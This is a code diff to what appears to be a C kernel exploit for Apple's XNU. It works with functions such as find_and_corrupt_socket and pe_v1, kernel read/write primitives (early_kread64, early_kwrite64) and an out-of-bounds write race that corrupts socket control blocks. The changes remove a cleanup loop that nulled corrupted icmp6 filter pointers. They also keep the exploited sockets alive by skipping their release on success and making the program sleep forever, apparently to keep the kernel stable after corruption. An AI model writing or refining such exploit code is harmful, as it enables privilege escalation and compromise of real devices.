@@ -720,24 +720,6 @@ int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOf
 		controlSocketPcb = __xpaci(early_kread64(rwSocketPcb + OFFSET_PCB_LIST_NEXT));
 		printf("[i] controlSocketPcb=%#llx\n", controlSocketPcb); fflush(stdout);
 
-		// NULL all icmp6_filter pointers on the target zone page BEFORE sockets_release.
-		// The OOB write race may have corrupted neighboring PCBs' filters with stale data.
-		// When sockets_release frees those sockets, rip6_detach → kfree_type would panic
-		// on the corrupted pointer. NULLing makes rip6_detach skip the kfree entirely.
-		// We can safely do this now because KRW is established and all sockets are alive.
-		// NULL filters on both pages (rwSocket's and controlSocket's, may be different pages)
-		uint64_t pages[2] = { rwSocketPcb & ~0x3FFFULL, controlSocketPcb & ~0x3FFFULL };
-		int npages = (pages[0] == pages[1]) ? 1 : 2;
-		for (int pg = 0; pg < npages; pg++) {
-			for (int pi = 0; pi < 16; pi++) {
-				uint64_t pcbAddr = pages[pg] + pi * 0x400;
-				if (pcbAddr == controlSocketPcb)
-					continue;
-				early_kwrite64(pcbAddr + OFFSET_ICMP6FILT, 0);
-			}
-		}
-		printf("[i] NULLed filters on %d page(s)\n", npages); fflush(stdout);
-
 		return KERN_SUCCESS;
 	}
 	return -1;
@@ -844,7 +826,7 @@ void pe_v1(void)
 				break;
 			}
 		}
-		sockets_release(&socketPorts);
+		if (!success) sockets_release(&socketPorts);
 		for (uint64_t s = 0; s < searchMappingNum; s++) {
 			mach_vm_address_t searchMappingAddress = u64_array_last(&searchMappings);
 			u64_array_pop(&searchMappings);
@@ -935,7 +917,7 @@ int main(int argc, char* argv[])
 	// controlSocketPcb already read inside find_and_corrupt_socket (before sockets_release)
 	printf("[i] controlSocketPcb=%#llx rwSocketPcb=%#llx\n", controlSocketPcb, rwSocketPcb); fflush(stdout);
 
-	krw_sockets_leak_forever();
+	// skip krw_sockets_leak_forever — sockets stay alive via port refs (no sockets_release on success)
 	printf("[+] sockets leaked\n"); fflush(stdout);
 
 	uint64_t socketAddr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
@@ -1021,6 +1003,6 @@ int main(int argc, char* argv[])
 		closedir(dir);
 	}
 
-	printf("[*] DONE\n"); fflush(stdout);
-	return 0;
+	printf("[*] DONE — sleeping (sockets held by ports)\n"); fflush(stdout);
+	while (1) sleep(3600);
 }
